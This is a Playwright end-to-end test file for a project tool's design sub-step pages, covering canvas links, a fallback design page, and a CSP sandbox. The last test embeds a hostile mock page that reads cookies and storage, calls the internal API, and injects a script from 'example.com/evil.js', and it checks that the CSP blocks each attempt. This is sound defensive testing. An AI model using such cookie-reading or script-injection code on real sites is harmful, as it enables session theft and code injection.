// HO-850 metric line 2, the owner's click path: an item whose "Design the
// screens" sub-step made a Studio canvas. On the item page the sub-step row's
// artifact link opens the sub-step's own artifact page, which links the
// canvas — after a reload too. A second round that updated the same canvas is
// the latest page, and round 1 is still one click away in its attempts list.
//
// The snapshot and the done runs are written straight into the database, as
// the farm's design run leaves them (domain/js/designCanvas.js's canvas line
// first). The canvas links are fixtures: nothing here reaches Studio.

import { test, expect } from '../fixtures/test-base.js'
import { openDb, insertItem, insertProject, insertStepRun } from '../fixtures/seed.js'
import { requiredStepIndex } from '../../domain/js/lifecycle.js'
import { canvasUrlFor } from '../../domain/js/designCanvas.js'
import { readFileSync } from 'node:fs'

const DB_PATH = process.env.HORIZON_E2E_DB
const visualPageRules = JSON.parse(readFileSync(new URL('../../domain/visualPage.json', import.meta.url), 'utf8'))
const ID = 'HZ-E2E-DESIGN'
const PROJECT = 'E2E Design canvas'
const FIRST_GATE = requiredStepIndex('Approve & prioritize this work')
const SUB = { id: 'design-screens', label: 'Design the screens', kind: 'opening', anchor: 1, persona: null, output: 'design' }
const SLUG = 'horizon-hz-e2e-design-design-screens'
const CANVAS = canvasUrlFor(SLUG)
const artifact = (version, action) =>
  `**Canvas:** [Open the design canvas](${CANVAS}) · slug \`${SLUG}\` · version ${version}\n\n${action}\n\n- \`board\`: the filter row.`

function insertRound(db, attempt, version, action) {
  const runId = insertStepRun(db, {
    itemId: ID,
    stepIndex: SUB.anchor,
    attempt,
    agent: 'PM',
    output: `drew the screens (round ${attempt})`,
    artifact: artifact(version, action),
    startedAt: `2026-11-17 10:0${attempt}:00`,
    endedAt: `2026-11-17 10:0${attempt}:30`,
  })
  db.prepare('UPDATE step_run SET substep_id = ? WHERE id = ?').run(SUB.id, runId)
}

test.beforeAll(() => {
  const db = openDb(DB_PATH)
  try {
    // beforeAll re-runs in a fresh worker after a failed test; seed once.
    if (db.prepare('SELECT 1 FROM work_item WHERE id = ?').get(ID)) return
    const projectId = insertProject(db, { name: PROJECT })
    insertItem(db, { id: ID, title: 'E2E fixture — a design sub-step with a canvas', cursor: FIRST_GATE, project_id: projectId })
    db.prepare('UPDATE work_item SET substeps_json = ? WHERE id = ?').run(JSON.stringify([SUB]), ID)
    insertRound(db, 1, 2, 'New canvas.')
  } finally {
    db.close()
  }
})

const designRow = (page) => page.getByTestId('substep-row').filter({ hasText: SUB.label })

test('the sub-step’s artifact link opens a page that links the canvas, and a second round updates it', async ({ page }) => {
  await page.goto(`/${ID.toLowerCase()}`)
  const row = designRow(page)
  await expect(row).toBeVisible({ timeout: 15_000 })
  const link = row.getByRole('link', { name: 'View full artifact ↗' })
  await expect(link).toBeVisible()
  const href = await link.getAttribute('href')
  expect(href).toContain(`/items/${ID}/artifacts/${SUB.anchor}?substep=${SUB.id}`)

  await page.goto(href)
  const canvas = page.getByRole('link', { name: 'Open the design canvas' })
  await expect(canvas).toHaveAttribute('href', CANVAS, { timeout: 15_000 })
  await expect(page.getByText('New canvas.')).toBeVisible()
  await page.reload()
  await expect(page.getByRole('link', { name: 'Open the design canvas' })).toHaveAttribute('href', CANVAS, { timeout: 15_000 })

  // Round 2 updated the same canvas.
  const db = openDb(DB_PATH)
  try {
    if (!db.prepare('SELECT 1 FROM step_run WHERE item_id = ? AND substep_id = ? AND attempt = 2').get(ID, SUB.id)) {
      insertRound(db, 2, 5, 'Updated the previous canvas (version 2 → 5).')
    }
  } finally {
    db.close()
  }
  await page.reload()
  await expect(page.getByText('Updated the previous canvas (version 2 → 5).')).toBeVisible({ timeout: 15_000 })
  await expect(page.getByRole('link', { name: 'Open the design canvas' })).toHaveAttribute('href', CANVAS)

  // Round 1 is still reachable from the attempts list, on the same canvas.
  const round1 = page.locator(`a[href*="/artifacts/${SUB.anchor}/1?substep=${SUB.id}"]`)
  await expect(round1).toBeVisible()
  await round1.click()
  await expect(page.getByText('New canvas.')).toBeVisible({ timeout: 15_000 })
  await expect(page.getByRole('link', { name: 'Open the design canvas' })).toHaveAttribute('href', CANVAS)
})

// HZ-938 metrics 1 and 2: a box whose chosen tool (Studio) could not run drew
// the round as a Horizon page. The item waits at its first gate, not paused;
// the sub-step row names the tool and says Studio was missing, and links the
// item's design page; the gate's design panel shows the round's desktop shot.
// After a reload all of it is still there, and round 2 keeps the same link.
// Seeded as the farm's result leaves it (the server-side completion is
// server/test/substep-design-run.test.mjs); the page and shot routes are
// fulfilled in the browser, as there is no farm here.
const PAGE_ID = 'HZ-E2E-DESIGN-PAGE'
const PAGE_LINK = `/api/items/${PAGE_ID}/design-page`
const FALLBACK = "Studio isn't available on this box; drawn as a Horizon page"
// A real 1×1 PNG, so the thumbnail decodes.
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64')

function insertPageRound(db, n) {
  const runId = insertStepRun(db, {
    itemId: PAGE_ID,
    stepIndex: SUB.anchor,
    attempt: n,
    agent: 'PM',
    output: `drew the screens as a Horizon page (round ${n})`,
    artifact: `**Design page:** [Open the design page](${PAGE_LINK}) · round ${n}\n\n${n === 1 ? 'New design page.' : `Updated the design page (round ${n}).`}`,
    startedAt: `2026-11-18 10:0${n}:00`,
    endedAt: `2026-11-18 10:0${n}:30`,
  })
  db.prepare('UPDATE step_run SET substep_id = ? WHERE id = ?').run(SUB.id, runId)
  db.prepare(
    `INSERT INTO substep_round (item_id, substep_id, round, kind, run_id, brief, what_changed, design_tool, design_system, fallback_from, created_by)
     VALUES (?, ?, ?, 'run', ?, 'Draw the board.', ?, 'html', 'horizon-production', 'studio', 'Horizon')`,
  ).run(PAGE_ID, SUB.id, n, runId, `round ${n}`)
  db.prepare(
    'INSERT INTO item_design_page_round (item_id, round, step_run_id, sha256, bytes, desktop_png, phone_png) VALUES (?, ?, ?, ?, 100, ?, ?)',
  ).run(PAGE_ID, n, runId, String(n).repeat(64), `page-r${n}-desktop.png`, `page-r${n}-phone.png`)
}

test('a round drawn as a Horizon page because Studio is missing: the card says so, links the page, and round 2 keeps the link', async ({ page }) => {
  const db = openDb(DB_PATH)
  try {
    if (!db.prepare('SELECT 1 FROM work_item WHERE id = ?').get(PAGE_ID)) {
      const projectId = insertProject(db, { name: 'E2E Design page' })
      db.prepare('UPDATE project SET definitions_enabled = 1 WHERE id = ?').run(projectId)
      insertItem(db, { id: PAGE_ID, title: 'E2E fixture — a design drawn as a Horizon page', cursor: FIRST_GATE, project_id: projectId })
      db.prepare('UPDATE work_item SET substeps_json = ? WHERE id = ?').run(JSON.stringify([SUB]), PAGE_ID)
      insertPageRound(db, 1)
    }
  } finally {
    db.close()
  }
  await page.context().route(`**${PAGE_LINK}/shots/*`, (route) => route.fulfill({ status: 200, contentType: 'image/png', body: PNG }))

  async function expectRound(n) {
    const row = designRow(page)
    await expect(row.getByTestId('substep-round')).toHaveText(`Round ${n}`, { timeout: 15_000 })
    await expect(row.getByTestId('substep-tool')).toContainText('Drawn with Horizon page (horizon-production)')
    await expect(row.getByText(FALLBACK)).toBeVisible()
    const link = row.getByRole('link', { name: 'Open the design page ↗' })
    expect(await link.getAttribute('href')).toMatch(new RegExp(`${PAGE_LINK}$`))
    const shot = page.getByTestId('design-panel').getByRole('img', { name: `Design page round ${n}, desktop screenshot` })
    await expect(shot).toBeVisible()
    await expect.poll(() => shot.evaluate((i) => i.complete && i.naturalWidth)).toBeGreaterThan(0)
    const item = (await (await page.request.get('/api/items')).json()).items.find((it) => it.id === PAGE_ID)
    expect(item.paused).toBeFalsy()
    return link.getAttribute('href')
  }

  await page.goto(`/${PAGE_ID.toLowerCase()}`)
  const href = await expectRound(1)
  await page.reload()
  expect(await expectRound(1)).toBe(href)

  const again = openDb(DB_PATH)
  try {
    if (!again.prepare('SELECT 1 FROM substep_round WHERE item_id = ? AND round = 2').get(PAGE_ID)) insertPageRound(again, 2)
  } finally {
    again.close()
  }
  await page.reload()
  expect(await expectRound(2)).toBe(href)
})

// HZ-938 metric 4 and guardrail 4: what the design page's CSP does in a real
// browser, not just its header text. A hostile mock, served at the design
// page URL under the real PAGE_CSP from domain/visualPage.json while the
// owner's Horizon session cookie is in the browser, cannot read cookies or
// storage, cannot reach Horizon's API, and makes no request off Horizon —
// not an image, not an injected script — while its own inline script runs.
test('the design page sandbox: a hostile mock gets no cookie, no API, no outside request; only its own script runs', async ({ page }) => {
  const HOSTILE_ID = 'HZ-E2E-DESIGN-HOSTILE'
  const hostile = `<!doctype html>
<html>
<body>
<div id="out">pending</div>
<img src="https://example.com/x.png" alt="">
<script>
const out = { inline: true }
try { out.cookie = document.cookie } catch (e) { out.cookie = 'blocked:' + e.name }
try { localStorage.setItem('k', 'v'); out.storage = 'ok' } catch (e) { out.storage = 'blocked' }
const injected = document.createElement('script')
injected.src = 'https://example.com/evil.js'
document.head.appendChild(injected)
fetch('/api/items')
  .then((r) => { out.fetch = 'ok:' + r.status })
  .catch(() => { out.fetch = 'blocked' })
  .finally(() => {
    setTimeout(() => {
      out.evil = window.evilRan === true
      const el = document.getElementById('out')
      el.textContent = JSON.stringify(out)
      el.dataset.done = '1'
    }, 300)
  })
</script>
</body>
</html>
`
  // Chromium raises a request event for a load the CSP then blocks, so an
  // outside load counts as stopped only when it failed as blocked by the CSP
  // and never reached the network (the route below would answer it).
  const outside = []
  const blocked = []
  const reached = []
  const offHorizon = (url) => !['localhost', '127.0.0.1'].includes(new URL(url).hostname)
  page.on('request', (req) => offHorizon(req.url()) && outside.push(req.url()))
  page.on('requestfailed', (req) => offHorizon(req.url()) && /BLOCKED_BY_CSP|csp/i.test(req.failure()?.errorText ?? '') && blocked.push(req.url()))
  await page.context().route('https://example.com/**', (route) => {
    reached.push(route.request().url())
    return route.fulfill({ status: 200, contentType: 'text/javascript', body: 'window.evilRan = true' })
  })
  await page.context().route(`**/api/items/${HOSTILE_ID}/design-page`, (route) =>
    route.fulfill({
      status: 200,
      contentType: 'text/html; charset=utf-8',
      headers: { 'Content-Security-Policy': visualPageRules.csp, 'X-Content-Type-Options': 'nosniff', 'Referrer-Policy': 'no-referrer' },
      body: hostile,
    }),
  )
  // The owner's session is live in this context: Horizon's own API answers it.
  expect((await page.request.get('/api/items')).status()).toBe(200)
  expect((await page.context().cookies()).length).toBeGreaterThan(0)

  await page.goto(`/api/items/${HOSTILE_ID}/design-page`)
  const out = page.locator('#out[data-done="1"]')
  await expect(out).toBeVisible({ timeout: 15_000 })
  const result = JSON.parse(await out.textContent())
  expect(result.inline).toBe(true)
  expect(result.cookie === '' || String(result.cookie).startsWith('blocked:')).toBe(true)
  expect(result.storage).toBe('blocked')
  expect(result.fetch).toBe('blocked')
  expect(result.evil).toBe(false)
  expect(reached).toEqual([])
  await expect.poll(() => [...blocked].sort()).toEqual([...outside].sort())
})
